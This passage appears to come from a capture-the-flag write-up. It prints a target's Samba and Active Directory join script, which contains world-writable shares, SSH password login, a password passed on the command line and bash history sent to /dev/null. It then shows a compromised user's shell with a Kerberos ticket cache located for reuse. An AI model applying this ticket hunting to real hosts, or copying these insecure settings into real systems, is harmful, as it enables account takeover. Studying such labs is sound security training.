crudini --set $SAMBA_CONF global "workgroup" "$WORKGROUP"
crudini --set $SAMBA_CONF global "server string" "$SERVER_STRING"

# Add the IPs / subnets allowed acces to the server in general.
crudini --set $SAMBA_CONF global "hosts allow" "$HOSTS_ALLOW"

# log files split per-machine.
crudini --set $SAMBA_CONF global "log file" "$LOG_FILE"

# Enable debug
crudini --set $SAMBA_CONF global "log level" "$LOG_LEVEL"

# Maximum size per log file, then rotate.
crudini --set $SAMBA_CONF global "max log size" "$MAX_LOG_SIZE"

# Active Directory
crudini --set $SAMBA_CONF global "security" "$SECURITY"
crudini --set $SAMBA_CONF global "encrypt passwords" "$ENCRYPT_PASSWORDS"
crudini --set $SAMBA_CONF global "passdb backend" "tdbsam"
crudini --set $SAMBA_CONF global "realm" "$REALM"

# Disable Printers.
crudini --set $SAMBA_CONF global "printcap name" "/dev/null"
crudini --set $SAMBA_CONF global "panic action" "no"
crudini --set $SAMBA_CONF global "cups options" "raw"

# Name resolution order
crudini --set $SAMBA_CONF global "name resolve order" "$NAME_RESOLVE_ORDER"

# Performance Tuning
crudini --set $SAMBA_CONF global "socket options" "$SOCKET_OPTIONS"
crudini --set $SAMBA_CONF global "read raw" "$READ_RAW"
crudini --set $SAMBA_CONF global "write raw" "$WRITE_RAW"
crudini --set $SAMBA_CONF global "oplocks" "$OPLOCKS"
crudini --set $SAMBA_CONF global "level2 oplocks" "$LEVEL2_OPLOCKS"
crudini --set $SAMBA_CONF global "kernel oplocks" "$KERNEL_OPLOCKS"
crudini --set $SAMBA_CONF global "max xmit" "$MAX_XMIT"
crudini --set $SAMBA_CONF global "dead time" "$DEAD_TIME"

# Point to specific kerberos server
crudini --set $SAMBA_CONF global "password server" "$PASSWORD_SERVER"

# #crudini --set $SAMBA_CONF global "winbind separator" "$WINBIND_SEPARATOR"
crudini --set $SAMBA_CONF global "winbind uid" "$WINBIND_UID"
crudini --set $SAMBA_CONF global "winbind gid" "$WINBIND_GID"
crudini --set $SAMBA_CONF global "winbind use default domain" "$WINDBIND_USE_DEFAULT_DOMAIN"
crudini --set $SAMBA_CONF global "winbind enum users" "$WINBIND_ENUM_USERS"
crudini --set $SAMBA_CONF global "winbind enum groups" "$WINBIND_ENUM_GROUPS"
crudini --set $SAMBA_CONF global "template homedir" "$TEMPLATE_HOMEDIR"
crudini --set $SAMBA_CONF global "template shell" "$TEMPLATE_SHELL"
crudini --set $SAMBA_CONF global "client use spnego" "$CLIENT_USE_SPNEGO"
crudini --set $SAMBA_CONF global "client ntlmv2 auth" "$CLIENT_NTLMV2_AUTH"
crudini --set $SAMBA_CONF global "encrypt passwords" "$ENCRYPT_PASSWORDS"
crudini --set $SAMBA_CONF global "server signing" "$SERVER_SIGNING"
crudini --set $SAMBA_CONF global "smb encrypt" "$SMB_ENCRYPT"
crudini --set $SAMBA_CONF global "restrict anonymous" "$RESTRICT_ANONYMOUS"
crudini --set $SAMBA_CONF global "domain master" "$DOMAIN_MASTER"
crudini --set $SAMBA_CONF global "local master" "$LOCAL_MASTER"
crudini --set $SAMBA_CONF global "preferred master" "$PREFERRED_MASTER"
crudini --set $SAMBA_CONF global "os level" "$OS_LEVEL"
# crudini --set $SAMBA_CONF global "wins support" "$WINS_SUPPORT"
# crudini --set $SAMBA_CONF global "wins server" "$WINS_SERVER"
crudini --set $SAMBA_CONF global "dns proxy" "$DNS_PROXY"
crudini --set $SAMBA_CONF global "log level" "$LOG_LEVEL"
crudini --set $SAMBA_CONF global "debug timestamp" "$DEBUG_TIMESTAMP"
crudini --set $SAMBA_CONF global "log file" "$LOG_FILE"
crudini --set $SAMBA_CONF global "max log size" "$MAX_LOG_SIZE"
# crudini --set $SAMBA_CONF global "syslog only" "$SYSLOG_ONLY"
# crudini --set $SAMBA_CONF global "syslog" "$SYSLOG"
# crudini --set $SAMBA_CONF global "panic action" "$PANIC_ACTION"
# crudini --set $SAMBA_CONF global "hosts allow" "$HOSTS_ALLOW"

# Inherit groups in groups
crudini --set $SAMBA_CONF global "winbind nested groups" "no"
crudini --set $SAMBA_CONF global "winbind refresh tickets" "yes"
crudini --set $SAMBA_CONF global "winbind offline logon" "true"

# home shared directory (restricted to owner)
crudini --set $SAMBA_CONF home "comment" "Home Directories"
crudini --set $SAMBA_CONF home "path" "/home/"
crudini --set $SAMBA_CONF home "public" "yes"
crudini --set $SAMBA_CONF home "guest ok" "no"
crudini --set $SAMBA_CONF home "read only" "no"
crudini --set $SAMBA_CONF home "writeable" "yes"
crudini --set $SAMBA_CONF home "create mask" "0777"
crudini --set $SAMBA_CONF home "directory mask" "0777"
crudini --set $SAMBA_CONF home "browseable" "yes"
crudini --set $SAMBA_CONF home "printable" "no"
crudini --set $SAMBA_CONF home "oplocks" "yes"
#crudini --set $SAMBA_CONF home "valid users" "%S"

# public shared directory (unrestricted)
mkdir -p "/usr/share/public" && chmod 777 "/usr/share/public/"

crudini --set $SAMBA_CONF public "comment" "Public Directories"
crudini --set $SAMBA_CONF public "path" "/usr/share/public/"
crudini --set $SAMBA_CONF public "public" "yes"
crudini --set $SAMBA_CONF public "guest ok" "no"
crudini --set $SAMBA_CONF public "read only" "no"
crudini --set $SAMBA_CONF public "writeable" "yes"
crudini --set $SAMBA_CONF public "create mask" "0774"
crudini --set $SAMBA_CONF public "directory mask" "0777"
crudini --set $SAMBA_CONF public "browseable" "yes"
crudini --set $SAMBA_CONF public "printable" "no"
crudini --set $SAMBA_CONF public "oplocks" "yes"

# private shared directory (restricted)
mkdir -p "/usr/share/private" && chmod 777 "/usr/share/private"

crudini --set $SAMBA_CONF private "comment" "Private Directories"
crudini --set $SAMBA_CONF private "path" "/usr/share/private/"
crudini --set $SAMBA_CONF private "public" "yes"
crudini --set $SAMBA_CONF private "guest ok" "no"
crudini --set $SAMBA_CONF private "read only" "no"
crudini --set $SAMBA_CONF private "writeable" "yes"
crudini --set $SAMBA_CONF private "create mask" "0774"
crudini --set $SAMBA_CONF private "directory mask" "0777"
crudini --set $SAMBA_CONF private "browseable" "yes"
crudini --set $SAMBA_CONF private "printable" "no"
crudini --set $SAMBA_CONF private "oplocks" "yes"

echo --------------------------------------------------
echo "Updating NSSwitch configuration: \"/etc/nsswitch.conf\""
echo --------------------------------------------------
if [[ ! `grep "winbind" /etc/nsswitch.conf` ]]; then
        sed -i "s#^\(passwd\:\s*compat\)\$#\1 winbind#" /etc/nsswitch.conf
        sed -i "s#^\(group\:\s*compat\)\$#\1 winbind#" /etc/nsswitch.conf
        sed -i "s#^\(shadow\:\s*compat\)\$#\1 winbind#" /etc/nsswitch.conf
fi

pam-auth-update

/etc/init.d/nmbd restart
/etc/init.d/smbd restart
/etc/init.d/winbind restart

echo --------------------------------------------------
echo 'Generating Kerberos ticket'
echo --------------------------------------------------
echo $AD_PASSWORD | kinit -V $AD_USERNAME@$REALM

echo --------------------------------------------------
echo 'Registering to Active Directory'
echo --------------------------------------------------
net ads join -U"$AD_USERNAME"%"$AD_PASSWORD"
#wbinfo --online-status

echo --------------------------------------------------
echo 'Stopping Samba to enable handling by supervisord'
echo --------------------------------------------------
/etc/init.d/nmbd stop
/etc/init.d/smbd stop
/etc/init.d/winbind stop

echo --------------------------------------------------
echo 'Enabling SSH'
echo --------------------------------------------------
sed -i 's/^#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
service ssh restart

kdestroy
ln -s /dev/null /root/.bash_history
mkdir -p /home/GHOST/florence.ramirez
ln -s /dev/null /home/GHOST/florence.ramirez/.bash_history

touch /tmp/init_success

echo --------------------------------------------------
echo 'Restarting Samba using supervisord'
echo --------------------------------------------------
exec "$@"
```

</details>

Kerberos ticket found at `/tmp/krb5cc_50`:

```console
florence.ramirez@LINUX-DEV-WS01:~$ env
env
SHELL=/bin/bash
KRB5CCNAME=FILE:/tmp/krb5cc_50
PWD=/home/GHOST/florence.ramirez
LOGNAME=florence.ramirez
MOTD_SHOWN=pam
HOME=/home/GHOST/florence.ramirez
SSH_CONNECTION=172.18.0.3 53590 172.18.0.2 22
USER=florence.ramirez
SHLVL=2
LC_CTYPE=C.UTF-8
SSH_CLIENT=172.18.0.3 53590 22
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
_=/usr/bin/env
OLDPWD=/tmp
```
